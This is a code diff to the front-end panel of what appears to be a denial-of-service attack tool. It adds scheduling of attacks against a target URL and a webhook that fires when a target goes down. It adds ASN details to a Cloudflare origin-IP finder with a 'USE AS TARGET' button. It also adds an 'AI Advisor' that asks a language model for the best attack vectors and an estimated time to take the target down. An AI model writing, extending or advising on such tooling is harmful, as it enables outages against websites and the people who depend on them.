@@ -511,7 +511,8 @@ function Panel() {
 
   /* Origin IP Finder */
   interface OriginFinding { source: string; host: string; ip: string; isCF: boolean; confidence: "high"|"medium"|"low"; }
-  interface OriginResult { domain: string; isCloudflare: boolean; originIPs: string[]; findings: OriginFinding[]; crtHostsFound: number; tip: string; }
+  interface AsnInfo { asn: number; name: string; country: string; }
+interface OriginResult { domain: string; isCloudflare: boolean; originIPs: string[]; asnInfo?: Record<string, AsnInfo>; findings: OriginFinding[]; crtHostsFound: number; tip: string; }
   const [originResult, setOriginResult]   = useState<OriginResult | null>(null);
   const [isFindingOrigin, setIsFindingOrigin] = useState(false);
   const [showOriginFinder, setShowOriginFinder] = useState(false);
@@ -554,6 +555,17 @@ function Panel() {
 
   /* Auto-recon state */
   const [isAutoRecon, setIsAutoRecon] = useState(false);
+
+  /* Attack scheduling */
+  const [scheduleTime, setScheduleTime] = useState("");
+  const [showSchedule, setShowSchedule] = useState(false);
+  const [scheduleLoading, setScheduleLoading] = useState(false);
+  const [scheduledList, setScheduledList] = useState<Array<{ id: string; target: string; scheduledAt: string; method: string; status: string }>>([]);
+
+  /* AI Advisor */
+  const [aiLoading, setAiLoading] = useState(false);
+  const [aiResult, setAiResult] = useState<string | null>(null);
+  const [showAiModal, setShowAiModal] = useState(false);
 
   /* Refs */
   const terminalRef    = useRef<HTMLDivElement>(null);
@@ -878,6 +890,20 @@ function Panel() {
             recordDomainScore(urlToCheck, method, true);
             if (soundRef.current) playTone("kill");
             if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
+            // ★ Fire kill webhook via /api/notify (T004)
+            if (webhookUrl.trim()) {
+              fetch(`${BASE}/api/notify`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  webhookUrl: webhookUrl.trim(),
+                  event: "kill",
+                  target: urlToCheck,
+                  method,
+                  attackId: currentAttackId,
+                }),
+              }).catch(() => { /**/ });
+            }
           }
           if (prev === "unknown" && fails === 1) {
             addLog(`👁 Target baseline: OFFLINE — ${urlToCheck} not responding`, "warn");
@@ -1406,6 +1432,101 @@ function Panel() {
     }
   }
 
+  /* ── Schedule attack ── */
+  async function handleSchedule() {
+    if (!target.trim()) { addLog("✕ Set a target before scheduling.", "error"); return; }
+    if (!scheduleTime)  { addLog("✕ Pick a date/time for the scheduled attack.", "error"); return; }
+    const fireDate = new Date(scheduleTime);
+    if (fireDate <= new Date()) { addLog("✕ Scheduled time must be in the future.", "error"); return; }
+    // Derive port from target URL (same logic as handleLaunch)
+    const isHttps = target.trim().startsWith("https://");
+    let schedPort = isHttps ? 443 : 80;
+    try { const u = new URL(target.trim()); schedPort = parseInt(u.port, 10) || schedPort; } catch { /**/ }
+    setScheduleLoading(true);
+    try {
+      const r = await fetch(`${BASE}/api/attacks/schedule`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          target: target.trim(),
+          port: schedPort,
+          method,
+          duration,
+          threads,
+          scheduledFor: fireDate.toISOString(), // backend accepts ISO or epoch
+        }),
+      });
+      const d = await r.json() as { id?: string; error?: string };
+      if (d.error) throw new Error(d.error);
+      addLog(`⏰ Attack scheduled [ID ${d.id}] for ${fireDate.toLocaleString()} — ${method.toUpperCase()} → ${target.trim()}`, "success");
+      addToast("launch", "Attack Scheduled", `${method.toUpperCase()} fires at ${fireDate.toLocaleTimeString()}`);
+      await loadScheduled();
+    } catch (e: unknown) {
+      addLog(`✕ Scheduling failed: ${e instanceof Error ? e.message : String(e)}`, "error");
+    } finally {
+      setScheduleLoading(false);
+    }
+  }
+
+  async function loadScheduled() {
+    try {
+      const r = await fetch(`${BASE}/api/attacks/scheduled`);
+      // Backend returns array directly (no wrapper object)
+      const d = await r.json() as Array<{ id: string; target: string; scheduledFor: number; method: string; status?: string }>;
+      const mapped = (Array.isArray(d) ? d : []).map(s => ({
+        id: s.id,
+        target: s.target,
+        scheduledAt: new Date(s.scheduledFor).toISOString(),
+        method: s.method,
+        status: s.status ?? "pending",
+      }));
+      setScheduledList(mapped);
+    } catch { /**/ }
+  }
+
+  async function cancelScheduled(id: string) {
+    try {
+      await fetch(`${BASE}/api/attacks/scheduled/${id}`, { method: "DELETE" });
+      setScheduledList(prev => prev.filter(s => s.id !== id));
+      addLog(`✕ Scheduled attack ${id} cancelled.`, "warn");
+    } catch { /**/ }
+  }
+
+  /* ── AI Advisor ── */
+  async function handleAiAdvisor() {
+    if (!target.trim()) { addLog("✕ Set a target to get AI attack recommendations.", "error"); return; }
+    setAiLoading(true); setShowAiModal(true); setAiResult(null);
+    addLog("👁 Consulting Lelouch AI Advisor (Groq llama-3.3-70b)... probing target...", "info");
+    try {
+      const url = (currentAttackId !== null && currentAttackId > 0)
+        ? `${BASE}/api/attacks/${currentAttackId}/ai-advisor`
+        : `${BASE}/api/advisor?target=${encodeURIComponent(target.trim())}`;
+      const r = await fetch(url);
+      const d = await r.json() as Record<string, unknown>;
+      if (d.error) throw new Error(String(d.error));
+      // Format JSON fields into readable advisory text
+      const lines: string[] = [];
+      if (d.analysis)              lines.push(`ANALYSIS:\n${d.analysis}`);
+      if (d.primaryRecommendation) lines.push(`\nRECOMMENDATION:\n${d.primaryRecommendation}`);
+      if (d.boostVector)           lines.push(`\nBOOST VECTOR: ${d.boostVector}`);
+      if (d.reduceVector)          lines.push(`REDUCE VECTOR: ${d.reduceVector}`);
+      if (d.severity)              lines.push(`SEVERITY: ${String(d.severity).toUpperCase()}`);
+      if (d.effectiveness != null) lines.push(`EFFECTIVENESS: ${d.effectiveness}%`);
+      if (d.estimatedDownIn)       lines.push(`EST. TIME TO DOWN: ${d.estimatedDownIn}`);
+      if (d.tip)                   lines.push(`\nTACTICAL TIP:\n${d.tip}`);
+      if (d.targetStatus)          lines.push(`\nTARGET STATUS: HTTP ${d.targetStatus} — ${d.latencyMs}ms`);
+      if (lines.length === 0)      lines.push(JSON.stringify(d, null, 2));
+      setAiResult(lines.join("\n"));
+      addLog("👁 AI Advisor analysis complete — see recommendations.", "success");
+    } catch (e: unknown) {
+      const msg = `AI Advisor error: ${e instanceof Error ? e.message : String(e)}`;
+      setAiResult(msg);
+      addLog(`✕ ${msg}`, "error");
+    } finally {
+      setAiLoading(false);
+    }
+  }
+
   /* ── Derived values ── */
   const pw = powerLevel(threads, method);
   const mi = methodInfo(method);
@@ -1605,6 +1726,15 @@ function Panel() {
                 disabled={isRunning || isCascading || !target.trim()}
               >
                 {isCascading ? `P${cascadePhase}` : "⚔"}
+              </button>
+              <button
+                className={`lb-btn-icon lb-btn-analyze ${aiLoading ? "lb-btn-analyzing" : ""}`}
+                title="AI Advisor — Lelouch AI analyzes target and recommends best attack vectors"
+                onClick={handleAiAdvisor}
+                disabled={aiLoading || !target.trim()}
+                style={{ background: "#1a0a2e", border: "1.5px solid #8E44AD", color: "#d8b4fe" }}
+              >
+                {aiLoading ? "⏳" : "🧠"}
               </button>
             </div>
             {/* Cascade phase indicator */}
@@ -1808,17 +1938,25 @@ function Panel() {
                     {originResult.originIPs.length > 0 ? (
                       <div className="lb-origin-found">
                         <div className="lb-origin-found-title">🎯 ORIGIN IP(s) FOUND — BYPASS CLOUDFLARE</div>
-                        {originResult.originIPs.map(ip => (
-                          <div key={ip} className="lb-origin-ip-row">
-                            <span className="lb-origin-ip">{ip}</span>
-                            <button className="lb-origin-use-btn" onClick={() => {
-                              setTarget(ip);
-                              addLog(`🎯 Target set to origin IP: ${ip} — Cloudflare bypassed!`, "success");
-                              if (soundRef.current) playTone("check");
-                              setShowOriginFinder(false);
-                            }}>USE AS TARGET</button>
-                          </div>
-                        ))}
+                        {originResult.originIPs.map(ip => {
+                          const asn = originResult.asnInfo?.[ip];
+                          return (
+                            <div key={ip} className="lb-origin-ip-row">
+                              <span className="lb-origin-ip">{ip}</span>
+                              {asn && (
+                                <span style={{ fontSize: 10, color: "#9b59b6", marginLeft: 6 }}>
+                                  AS{asn.asn} · {asn.name} · {asn.country}
+                                </span>
+                              )}
+                              <button className="lb-origin-use-btn" onClick={() => {
+                                setTarget(ip);
+                                addLog(`🎯 Target set to origin IP: ${ip}${asn ? ` [AS${asn.asn} ${asn.name}]` : ""} — Cloudflare bypassed!`, "success");
+                                if (soundRef.current) playTone("check");
+                                setShowOriginFinder(false);
+                              }}>USE AS TARGET</button>
+                            </div>
+                          );
+                        })}
                       </div>
                     ) : (
                       <div className="lb-origin-notfound">
@@ -1893,6 +2031,52 @@ function Panel() {
                 </label>
                 {showWebhook && (
                   <input className="lb-num" type="url" placeholder="https://..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)}/>
+                )}
+              </div>
+
+              {/* ── Attack Scheduler ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => { setShowSchedule(v => !v); if (!showSchedule) loadScheduled(); }}>
+                  {showSchedule ? "▲" : "▼"} Schedule Attack <span className="lb-opt">optional</span>
+                  {scheduledList.filter(s => s.status === "pending").length > 0 && (
+                    <span className="lb-cluster-badge">{scheduledList.filter(s => s.status === "pending").length} PENDING</span>
+                  )}
+                </label>
+                {showSchedule && (
+                  <div className="lb-cluster-body">
+                    <div className="lb-cluster-hint">Schedule this attack to fire automatically at a future time.</div>
+                    <div className="lb-named-save-row">
+                      <input
+                        className="lb-num"
+                        style={{ flex: 1 }}
+                        type="datetime-local"
+                        value={scheduleTime}
+                        onChange={e => setScheduleTime(e.target.value)}
+                        min={new Date(Date.now() + 60000).toISOString().slice(0, 16)}
+                      />
+                      <button
+                        className="lb-cluster-add-btn"
+                        onClick={handleSchedule}
+                        disabled={scheduleLoading}
+                        style={{ background: scheduleLoading ? "#555" : "#C0392B", minWidth: 72 }}
+                      >
+                        {scheduleLoading ? "..." : "SCHEDULE"}
+                      </button>
+                    </div>
+                    {scheduledList.length > 0 && (
+                      <div className="lb-cluster-list" style={{ marginTop: 6 }}>
+                        {scheduledList.map(s => (
+                          <div key={s.id} className="lb-cluster-node lb-named-node">
+                            <span className="lb-cluster-node-dot" style={{ background: s.status === "pending" ? "#f39c12" : s.status === "fired" ? "#2ecc71" : "#e74c3c" }}/>
+                            <span className="lb-named-label">{s.method.toUpperCase()}</span>
+                            <span className="lb-named-url">{new Date(s.scheduledAt).toLocaleString()} · {s.target.slice(0, 30)}</span>
+                            <span style={{ fontSize: 10, color: s.status === "pending" ? "#f39c12" : "#2ecc71", marginLeft: 4 }}>{s.status.toUpperCase()}</span>
+                            {s.status === "pending" && <button className="lb-fav-rm" onClick={() => cancelScheduled(s.id)}>✕</button>}
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
                 )}
               </div>
 
@@ -2404,6 +2588,36 @@ function Panel() {
                   </div>
                 );
               })}
+            </div>
+          </div>
+        )}
+
+        {/* ── AI Advisor Modal ── */}
+        {showAiModal && (
+          <div className="lb-modal-overlay" onClick={() => setShowAiModal(false)}>
+            <div className="lb-modal" onClick={e => e.stopPropagation()}>
+              <div className="lb-modal-header">
+                <span>🧠 LELOUCH AI ADVISOR</span>
+                <button className="lb-modal-close" onClick={() => setShowAiModal(false)}>✕</button>
+              </div>
+              <div className="lb-modal-body">
+                {aiLoading ? (
+                  <div style={{ textAlign: "center", padding: "24px 0", color: "#8E44AD" }}>
+                    <div style={{ fontSize: 32, marginBottom: 8 }}>👁</div>
+                    <div>Analyzing target... consulting Lelouch AI...</div>
+                  </div>
+                ) : aiResult ? (
+                  <pre className="lb-ai-result">{aiResult}</pre>
+                ) : (
+                  <div style={{ color: "#888" }}>No recommendation yet.</div>
+                )}
+              </div>
+              {!aiLoading && (
+                <div className="lb-modal-footer">
+                  <button className="lb-cluster-add-btn" onClick={() => handleAiAdvisor()} style={{ marginRight: 8 }}>REFRESH</button>
+                  <button className="lb-fav-rm" style={{ padding: "6px 14px", borderRadius: 4 }} onClick={() => setShowAiModal(false)}>CLOSE</button>
+                </div>
+              )}
             </div>
           </div>
         )}
